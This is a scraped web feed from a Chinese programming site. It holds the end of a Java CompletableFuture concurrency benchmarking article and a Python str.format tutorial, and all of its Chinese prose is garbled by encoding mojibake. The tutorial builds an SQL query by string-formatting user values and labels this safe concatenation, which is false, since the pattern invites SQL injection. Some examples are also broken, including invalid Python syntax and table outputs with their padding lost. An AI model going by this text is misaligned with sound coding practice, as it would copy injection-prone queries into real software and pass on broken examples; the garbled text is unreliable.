<p>ä¸ºäº†éªŒè¯ä¸Šé¢æåˆ°çš„å‡ ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ¥åšä¸€ç»„å¯¹æ¯”å®éªŒã€‚ä»»åŠ¡åœºæ™¯æ˜¯æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯å¹¶è®¡ç®—ç§¯åˆ†ï¼Œå•æ¬¡æŸ¥è¯¢è€—æ—¶çº¦ 10 æ¯«ç§’ã€‚æ•°æ®åº“è¿æ¥æ± é…ç½® 20 ä¸ªè¿æ¥ã€‚</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// ä¸²è¡Œå¤„ç†
long <span class="hljs-attr">start</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
for (int userId : userIds) {
    User <span class="hljs-attr">user</span> = queryUser(userId)<span class="hljs-comment">;</span>
    calculatePoints(user)<span class="hljs-comment">;</span>
}
long <span class="hljs-attr">serialTime</span> = System.currentTimeMillis() - start<span class="hljs-comment">;</span>

// å¹¶è¡Œå¤„ç†ï¼ˆä¸åŒå¹¶å‘åº¦ï¼‰
for (int concurrency : new int<span class="hljs-section">[]</span>{10, 20, 50, 100, 200}) {
    ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(concurrency)<span class="hljs-comment">;</span>
    Semaphore <span class="hljs-attr">semaphore</span> = new Semaphore(<span class="hljs-number">20</span>)<span class="hljs-comment">; // é™åˆ¶æ•°æ®åº“å¹¶å‘</span>
    
    <span class="hljs-attr">start</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
    List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = userIds.stream()
        .map(userId -&gt; CompletableFuture.runAsync(() -&gt; {
            try {
                semaphore.acquire()<span class="hljs-comment">;</span>
                User <span class="hljs-attr">user</span> = queryUser(userId)<span class="hljs-comment">;</span>
                calculatePoints(user)<span class="hljs-comment">;</span>
            } finally {
                semaphore.release()<span class="hljs-comment">;</span>
            }
        }, executor))
        .collect(Collectors.toList())<span class="hljs-comment">;</span>
    
    CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
    long <span class="hljs-attr">parallelTime</span> = System.currentTimeMillis() - start<span class="hljs-comment">;</span>
    
    System.out.printf("Concurrency: %d, Time: %dms, Speedup: %.2fx%n",
        concurrency, parallelTime, (double)serialTime / parallelTime)<span class="hljs-comment">;</span>
    
    executor.shutdown()<span class="hljs-comment">;</span>
}
</code></pre>
<p>æµ‹è¯•ç»“æœï¼ˆå¤„ç† 1000 ä¸ªç”¨æˆ·ï¼‰ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Serial:</span> <span class="hljs-string">10200ms</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">10</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">1050ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">9.</span><span class="hljs-string">71x</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">20</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">530ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">19.</span><span class="hljs-string">25x</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">50</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">540ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">18.</span><span class="hljs-string">89x</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">100</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">650ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">15.</span><span class="hljs-string">69x</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">200</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">890ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">11.</span><span class="hljs-string">46x</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¹¶å‘åº¦åœ¨ 20 æ—¶è¾¾åˆ°æœ€ä½³æ€§èƒ½ï¼Œè¿™æ­£å¥½ç­‰äºæ•°æ®åº“è¿æ¥æ± å¤§å°ã€‚å†å¾€ä¸ŠåŠ ï¼Œæ€§èƒ½åè€Œä¸‹é™äº†ã€‚</p>
<p>æˆ‘åˆå»æ‰äº†ä¿¡å·é‡é™åˆ¶ï¼Œè®©æ‰€æœ‰çº¿ç¨‹ç›´æ¥ç«äº‰è¿æ¥æ± ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Concurrency:</span> <span class="hljs-number">50</span> <span class="hljs-string">(no</span> <span class="hljs-string">semaphore),</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">1200ms</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">100</span> <span class="hljs-string">(no</span> <span class="hljs-string">semaphore),</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">1850ms</span>
</code></pre>
<p>æ€§èƒ½æ˜¾è‘—å˜å·®ï¼Œå› ä¸ºå¤§é‡çº¿ç¨‹é˜»å¡åœ¨ç­‰å¾…è¿æ¥ä¸Šã€‚</p>
<p>æœ€åæµ‹è¯•ä»»åŠ¡ç²’åº¦çš„å½±å“ã€‚æŠŠ 1000 ä¸ªä»»åŠ¡æ‰“åŒ…æˆä¸åŒæ‰¹æ¬¡ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-number">1000</span> tasks individually: <span class="hljs-number">2100</span>ms
<span class="hljs-number">100</span> batches (<span class="hljs-number">10</span> tasks <span class="hljs-keyword">each</span>): <span class="hljs-number">180</span>ms
<span class="hljs-number">10</span> batches (<span class="hljs-number">100</span> tasks <span class="hljs-keyword">each</span>): <span class="hljs-number">95</span>ms
<span class="hljs-number">1</span> batch (<span class="hljs-number">1000</span> tasks): <span class="hljs-number">10200</span>ms (serial)
</code></pre>
<p>æ‰¹æ¬¡å¤§å°åœ¨ 50 åˆ° 100 ä¹‹é—´æ—¶æ•ˆæœæœ€å¥½ï¼Œæ—¢å‡å°‘äº†è°ƒåº¦å¼€é”€ï¼Œåˆä¿ç•™äº†å¹¶è¡Œåº¦ã€‚</p>
<h2 data-id="heading-7">å†™åœ¨æœ€å</h2>
<p>å¼€å¤´çš„äº‹æ•…ï¼Œåæ¥æ€ä¹ˆä¿®å¤çš„ï¼Ÿå…¶å®å¹¶ä¸å¤æ‚ï¼šä»»åŠ¡ç²’åº¦æ”¶ç²—ã€I/O å’Œ CPU åˆ†æ± ã€å¹¶å‘åº¦æŒ‰è¿æ¥æ± å®¹é‡å¡ä½ã€æ‰¹é‡æäº¤åŠ çª—å£ã€æ¯ä¸ªä»»åŠ¡åŠ è¶…æ—¶ä¸é™çº§ã€‚</p>
<p>CompletableFuture é€‚åˆç”¨åœ¨éœ€è¦å¹¶å‘è¡¨è¾¾ã€éœ€è¦ç»„åˆä¸ç¼–æ’çš„åœºæ™¯ã€‚</p>
<p>å¾æ—¥ä¸‰çœå¾èº«ã€‚</p>
<p>ä½¿ç”¨CompletableFutureæ—¶ï¼Œæœ€å¥½ä¹Ÿå…ˆæƒ³æ¸…æ¥šå‡ ä¸ªé—®é¢˜ï¼šå•ä»»åŠ¡æ˜¯å¦è¶³å¤Ÿé‡ã€å…±äº«èµ„æºæ˜¯å¦å……è¶³ã€ä¸‹æ¸¸æ˜¯å¦èƒ½æ‰¿å—å¹¶å‘ã€é˜Ÿåˆ—æ˜¯å¦æœ‰ä¸Šç•Œã€å¤±è´¥å’Œè¶…æ—¶æ˜¯å¦å¯æ§ã€‚</p>
<p>æœ‰äº†ç­”æ¡ˆï¼Œå†å»è½åœ°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[formatè¯­å¥]]></title>    <link>https://juejin.cn/post/7589978645135802378</link>    <guid>https://juejin.cn/post/7589978645135802378</guid>    <pubDate>2026-01-01T15:37:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589978645135802378" data-draft-id="7589897523269582858" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="formatè¯­å¥"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-01T15:37:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¯å¤©æ—©ç‚¹ç¡"/> <meta itemprop="url" content="https://juejin.cn/user/3150569573457415"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            formatè¯­å¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3150569573457415/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¯å¤©æ—©ç‚¹ç¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T15:37:54.000Z" title="Thu Jan 01 2026 15:37:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Python format æ ¼å¼åŒ–è¯¦è§£</h3>
<p><code>str.format()</code>Â æ˜¯ Python ä¸­ç”¨äºå­—ç¬¦ä¸²æ ¼å¼åŒ–çš„æ ¸å¿ƒæ–¹æ³•ï¼Œé€šè¿‡<strong>å ä½ç¬¦ {}</strong> Â ç»“åˆå‚æ•°æ›¿æ¢ï¼Œå®ç°çµæ´»çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ¯”ä¼ ç»Ÿçš„Â <code>%</code>Â æ ¼å¼åŒ–æ›´å¼ºå¤§ã€æ˜“è¯»ã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€åŸºç¡€ç”¨æ³•</h2>
<h3 data-id="heading-2">1. ä½ç½®å ä½ç¬¦</h3>
<h4 data-id="heading-3">ï¼ˆ1ï¼‰æŒ‰é¡ºåºåŒ¹é…</h4>
<p>å ä½ç¬¦Â <code>{}</code>Â æ— ç¼–å·æ—¶ï¼ŒæŒ‰å‚æ•°é¡ºåºä¸€ä¸€å¯¹åº”ï¼š</p>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åŸºç¡€ç¤ºä¾‹</span>
<span class="hljs-attr">text</span> = <span class="hljs-string">"{} æ˜¯ {} å¹´çš„ç¬¬ä¸€å¤©"</span>.format(<span class="hljs-number">1</span>æœˆ<span class="hljs-number">1</span>æ—¥, <span class="hljs-number">2026</span>)
print(text)  <span class="hljs-comment"># è¾“å‡ºï¼š1æœˆ1æ—¥ æ˜¯ 2026 å¹´çš„ç¬¬ä¸€å¤©</span>

<span class="hljs-comment"># å¤šå‚æ•°ç¤ºä¾‹</span>
<span class="hljs-attr">info</span> = <span class="hljs-string">"å§“åï¼š{}ï¼Œå¹´é¾„ï¼š{}ï¼ŒåŸå¸‚ï¼š{}"</span>.format(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-number">25</span>, <span class="hljs-string">"åŒ—äº¬"</span>)
print(info)  <span class="hljs-comment"># è¾“å‡ºï¼šå§“åï¼šå¼ ä¸‰ï¼Œå¹´é¾„ï¼š25ï¼ŒåŸå¸‚ï¼šåŒ—äº¬</span>
</code></pre>
<h4 data-id="heading-4">ï¼ˆ2ï¼‰æŒ‡å®šä½ç½®ç¼–å·</h4>
<p>é€šè¿‡Â <code>{æ•°å­—}</code>Â æŒ‡å®šå‚æ•°é¡ºåºï¼ˆæ•°å­—å¯¹åº” format å…¥å‚çš„ç´¢å¼•ï¼Œä» 0 å¼€å§‹ï¼‰ï¼Œå¯é‡å¤ä½¿ç”¨å‚æ•°ï¼š</p>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">text</span> = <span class="hljs-string">"ç¬¬{1}åï¼š{0}ï¼Œ{0} è·å¾—äº†{1}åçš„å¥½æˆç»©"</span>.format(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">1</span>)
print(text)  <span class="hljs-comment"># è¾“å‡ºï¼šç¬¬1åï¼šæå››ï¼Œæå›› è·å¾—äº†1åçš„å¥½æˆç»©</span>
</code></pre>
<h3 data-id="heading-5">2. å…³é”®å­—å ä½ç¬¦</h3>
<p>é€šè¿‡Â <code>{å…³é”®å­—}</code>Â åŒ¹é… format çš„å‘½åå‚æ•°ï¼Œå¯è¯»æ€§æ›´é«˜ï¼Œå‚æ•°é¡ºåºå¯ä»»æ„ï¼š</p>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">info</span> = <span class="hljs-string">"å§“åï¼š{name}ï¼Œå¹´é¾„ï¼š{age}ï¼ŒåŸå¸‚ï¼š{city}"</span>.format(age=<span class="hljs-number">25</span>, name=<span class="hljs-string">"å¼ ä¸‰"</span>, city=<span class="hljs-string">"åŒ—äº¬"</span>)
print(info)  <span class="hljs-comment"># è¾“å‡ºï¼šå§“åï¼šå¼ ä¸‰ï¼Œå¹´é¾„ï¼š25ï¼ŒåŸå¸‚ï¼šåŒ—äº¬</span>

<span class="hljs-comment"># ç»“åˆå­—å…¸ï¼ˆè§£åŒ…**ï¼‰</span>
<span class="hljs-attr">user</span> = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"ç‹äº”"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">30</span>, <span class="hljs-string">"city"</span>: <span class="hljs-string">"ä¸Šæµ·"</span>}
<span class="hljs-attr">info</span> = <span class="hljs-string">"å§“åï¼š{name}ï¼Œå¹´é¾„ï¼š{age}ï¼ŒåŸå¸‚ï¼š{city}"</span>.format(** user)
print(info)  <span class="hljs-comment"># è¾“å‡ºï¼šå§“åï¼šç‹äº”ï¼Œå¹´é¾„ï¼š30ï¼ŒåŸå¸‚ï¼šä¸Šæµ·</span>
</code></pre>
<hr/>
<h2 data-id="heading-6">äºŒã€è¿›é˜¶ç”¨æ³•ï¼ˆæ ¼å¼æ§åˆ¶ï¼‰</h2>
<p>åœ¨å ä½ç¬¦å†…é€šè¿‡Â <code>:</code>Â æŒ‡å®šæ ¼å¼ï¼Œè¯­æ³•ï¼š<code>{å ä½ç¬¦:æ ¼å¼è¯´æ˜}</code>ï¼Œæ”¯æŒæ•°å­—ã€å­—ç¬¦ä¸²ã€æ—¥æœŸç­‰æ ¼å¼åŒ–ã€‚</p>
<h3 data-id="heading-7">1. æ•°å­—æ ¼å¼åŒ–</h3>









































<table><thead><tr><th>æ ¼å¼ç¬¦</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th><th>è¾“å‡º</th></tr></thead><tbody><tr><td><code>d</code></td><td>æ•´æ•°ï¼ˆåè¿›åˆ¶ï¼‰</td><td><code>"{:d}".format(123)</code></td><td>123</td></tr><tr><td><code>f</code></td><td>æµ®ç‚¹æ•°ï¼ˆæŒ‡å®šå°æ•°ä½ï¼‰</td><td><code>"{:.2f}".format(3.1415)</code></td><td>3.14</td></tr><tr><td><code>%</code></td><td>ç™¾åˆ†æ¯”æ ¼å¼</td><td><code>"{:.1%}".format(0.85)</code></td><td>85.0%</td></tr><tr><td><code>,</code></td><td>åƒåˆ†ä½åˆ†éš”ç¬¦</td><td><code>"{:,}".format(1234567)</code></td><td>1,234,567</td></tr><tr><td><code>0å¡«å……</code></td><td>è¡¥é›¶åˆ°æŒ‡å®šé•¿åº¦</td><td><code>"{:04d}".format(12)</code></td><td>0012</td></tr></tbody></table>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æµ®ç‚¹æ•°ä¿ç•™2ä½å°æ•°</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åœ†å‘¨ç‡ï¼š{:.2f}"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3.1415926</span>))  <span class="hljs-comment"># è¾“å‡ºï¼šåœ†å‘¨ç‡ï¼š3.14</span>

<span class="hljs-comment"># ç™¾åˆ†æ¯”æ ¼å¼</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"é€šè¿‡ç‡ï¼š{:.1%}"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0.925</span>))  <span class="hljs-comment"># è¾“å‡ºï¼šé€šè¿‡ç‡ï¼š92.5%</span>

<span class="hljs-comment"># æ•´æ•°è¡¥é›¶ï¼ˆæ€»é•¿åº¦4ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¼–å·ï¼š{:04d}"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>))  <span class="hljs-comment"># è¾“å‡ºï¼šç¼–å·ï¼š0008</span>
</code></pre>
<h3 data-id="heading-8">2. å­—ç¬¦ä¸²æ ¼å¼åŒ–</h3>



































<table><thead><tr><th>æ ¼å¼ç¬¦</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th><th>è¾“å‡º</th></tr></thead><tbody><tr><td><code>&lt;n</code></td><td>å·¦å¯¹é½ï¼ˆæ€»é•¿åº¦ nï¼‰</td><td><code>"{:&lt;10}".format("Python")</code></td><td>Python</td></tr><tr><td><code>&gt;n</code></td><td>å³å¯¹é½ï¼ˆæ€»é•¿åº¦ nï¼‰</td><td><code>"{:&gt;10}".format("Python")</code></td><td>Python</td></tr><tr><td><code>^n</code></td><td>å±…ä¸­å¯¹é½ï¼ˆæ€»é•¿åº¦ nï¼‰</td><td><code>"{:^10}".format("Python")</code></td><td>Python</td></tr><tr><td><code>å¡«å……å­—ç¬¦</code></td><td>è‡ªå®šä¹‰å¡«å……</td><td><code>"{:*&lt;10}".format("Python")</code></td><td>Python****</td></tr></tbody></table>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å±…ä¸­å¯¹é½ï¼Œæ€»é•¿åº¦10ï¼Œå¡«å……-</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ ‡é¢˜ï¼š{:-^10}"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">"å…¬å‘Š"</span>))  <span class="hljs-comment"># è¾“å‡ºï¼šæ ‡é¢˜ï¼š----å…¬å‘Š----</span>

<span class="hljs-comment"># å·¦å¯¹é½ï¼Œæ€»é•¿åº¦8</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”¨æˆ·åï¼š{:&lt;8}"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">"admin"</span>))  <span class="hljs-comment"># è¾“å‡ºï¼šç”¨æˆ·åï¼šadmin    ï¼ˆåè¡¥ç©ºæ ¼ï¼‰</span>
</code></pre>
<h3 data-id="heading-9">3. æ—¥æœŸæ ¼å¼åŒ–ï¼ˆéœ€ç»“åˆ datetimeï¼‰</h3>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-perl" lang="perl">from datetime import datetime

now = datetime(<span class="hljs-number">2026</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">0</span>)
<span class="hljs-comment"># æ ¼å¼ï¼šå¹´-æœˆ-æ—¥ æ—¶:åˆ†:ç§’</span>
date_text = <span class="hljs-string">"å½“å‰æ—¶é—´ï¼š{:%Y-%m-%d %H:%M:%S}"</span>.format(now)
<span class="hljs-keyword">print</span>(date_text)  <span class="hljs-comment"># è¾“å‡ºï¼šå½“å‰æ—¶é—´ï¼š2026-01-01 10:30:00</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">ä¸‰ã€å¸¸è§åœºæ™¯ç¤ºä¾‹</h2>
<h3 data-id="heading-11">1. æ‹¼æ¥å¤æ‚å­—ç¬¦ä¸²</h3>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å•†å“ä¿¡æ¯æ ¼å¼åŒ–</span>
<span class="hljs-attr">product</span> = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"æ‰‹æœº"</span>, <span class="hljs-string">"price"</span>: <span class="hljs-number">2999.99</span>, <span class="hljs-string">"stock"</span>: <span class="hljs-number">500</span>}
<span class="hljs-attr">text</span> = <span class="hljs-string">"å•†å“ï¼š{name}ï¼Œå•ä»·ï¼š{price:.2f}å…ƒï¼Œåº“å­˜ï¼š{stock:,}å°"</span>.format(** product)
print(text)  <span class="hljs-comment"># è¾“å‡ºï¼šå•†å“ï¼šæ‰‹æœºï¼Œå•ä»·ï¼š2999.99å…ƒï¼Œåº“å­˜ï¼š500å°</span>
</code></pre>
<h3 data-id="heading-12">2. åŠ¨æ€ç”Ÿæˆ SQL è¯­å¥</h3>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-sql" lang="sql"># å®‰å…¨æ‹¼æ¥<span class="hljs-keyword">SQL</span>ï¼ˆé¿å…ç¡¬ç¼–ç ï¼‰
<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> "SELECT * FROM user WHERE name = '{name}' AND age &gt; {age}".format(name<span class="hljs-operator">=</span>"å¼ ä¸‰", age<span class="hljs-operator">=</span><span class="hljs-number">20</span>)
print(<span class="hljs-keyword">sql</span>)  # è¾“å‡ºï¼š<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'å¼ ä¸‰'</span> <span class="hljs-keyword">AND</span> age <span class="hljs-operator">&gt;</span> <span class="hljs-number">20</span>
</code></pre>
<hr/>
<h2 data-id="heading-13">å››ã€æ³¨æ„äº‹é¡¹</h2>
<ol>
<li>
<p><strong>å ä½ç¬¦åŒ¹é…</strong>ï¼šå…³é”®å­—å ä½ç¬¦å¿…é¡»ä¸ format çš„å‘½åå‚æ•°ä¸€è‡´ï¼Œä½ç½®å ä½ç¬¦ç´¢å¼•ä¸èƒ½è¶…å‡ºå‚æ•°æ•°é‡ï¼Œå¦åˆ™æŠ¥é”™ã€‚</p>
</li>
<li>
<p><strong>æ ¼å¼ç¬¦å…¼å®¹</strong>ï¼šä¸åŒç±»å‹çš„å‚æ•°éœ€åŒ¹é…å¯¹åº”æ ¼å¼ç¬¦ï¼ˆå¦‚æ•´æ•°ç”¨Â <code>d</code>ï¼Œæµ®ç‚¹æ•°ç”¨Â <code>f</code>ï¼‰ï¼Œå¦åˆ™æŠ¥é”™ã€‚</p>
</li>
<li>
<p><strong>ç®€æ´æ›¿ä»£</strong>ï¼šPython 3.6+ æ”¯æŒ f-stringï¼ˆ<code>f"{å˜é‡}"</code>ï¼‰ï¼Œæ˜¯ format çš„ç®€åŒ–ç‰ˆï¼Œæ›´é«˜æ•ˆï¼š</p>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">name</span> = <span class="hljs-string">"å¼ ä¸‰"</span>
<span class="hljs-attr">age</span> = <span class="hljs-number">25</span>
print(f"å§“åï¼š{name}ï¼Œå¹´é¾„ï¼š{age}")  <span class="hljs-comment"># ç­‰ä»·äº format å†™æ³•ï¼Œæ›´ç®€æ´</span>
</code></pre>
</li>
